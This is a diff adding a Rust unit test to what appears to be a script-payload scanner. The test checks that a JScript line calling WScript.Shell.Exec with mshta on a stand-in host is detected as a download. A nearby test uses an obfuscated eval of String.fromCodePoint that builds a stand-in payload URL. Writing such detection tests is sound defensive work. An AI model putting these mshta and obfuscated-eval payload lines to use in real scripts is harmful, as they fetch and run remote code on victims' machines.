@@ -20115,6 +20115,26 @@ new ActiveXObject("WScript.Shell").Run(cmd);"#
     }
 
     #[test]
+    fn js_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell").Exec("mshta js-exec.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "http://js-exec.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell.Exec schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_fromcodepoint_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"eval(String.fromCodePoint(104,116,116,112,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120))"#.to_vec();
